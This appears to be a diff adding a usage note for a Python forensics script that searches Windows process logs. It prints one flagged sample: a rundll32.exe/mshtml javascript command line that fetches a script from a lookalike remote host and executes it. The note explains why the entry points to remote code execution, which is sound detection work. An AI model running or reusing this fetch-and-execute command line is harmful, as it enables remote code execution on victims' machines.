@@ -1,0 +1,6 @@
+using the commandline arguments python .\forensics.py -d "[ROOT]\logs\SYS-320-w32processes\w32processes" -p Script -t javascript -y .\searchTerms.yml
+
+We will see results similar to the following 
+"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml | RunHTMLApplication "";document.write();GetObject(""script:\http://www.Ш3.com/netlgn.js'"").Exec();""" | 0003FXGWL | rundll32.exe | C:\Windows\System32\rundll32.exe | 592
+
+This is a suspicious process since the javascript run here is writing a document on victim machine with the javascript file on the host www.W3.com. It then executes the file. this could be remote code execution using mshtml
